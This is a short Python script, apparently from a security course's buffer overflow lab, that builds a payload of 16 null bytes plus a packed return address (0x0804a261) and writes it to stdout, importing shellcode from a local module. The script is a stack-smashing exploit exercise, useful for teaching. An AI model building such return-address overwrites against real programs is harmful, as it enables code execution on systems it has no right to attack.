import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
payload = b'\x00'*16
payload += pack('<I', 0x0804a261)


# Launch the attack!
sys.stdout.buffer.write(payload)
